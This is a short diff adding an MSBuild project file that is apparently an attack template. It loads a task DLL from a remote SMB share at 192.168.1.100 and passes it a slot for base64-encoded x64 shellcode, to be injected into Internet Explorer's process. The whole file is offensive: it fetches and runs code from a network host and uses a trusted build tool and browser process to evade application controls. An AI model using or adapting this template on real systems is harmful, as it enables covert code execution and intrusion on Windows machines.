@@ -1,0 +1,9 @@
+<Project xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+            <Target Name="MyTarget">
+                <SimpleTask
+                MyCode='<Base64 Encoded x64 Shellcode>'
+		        MyProcess='C:\Program Files\Internet Explorer\iexplore.exe'/>
+            </Target>
+        <UsingTask TaskName="SimpleTask" AssemblyFile='\\192.168.1.100\share\IEShim.dll' />
+</Project>
+
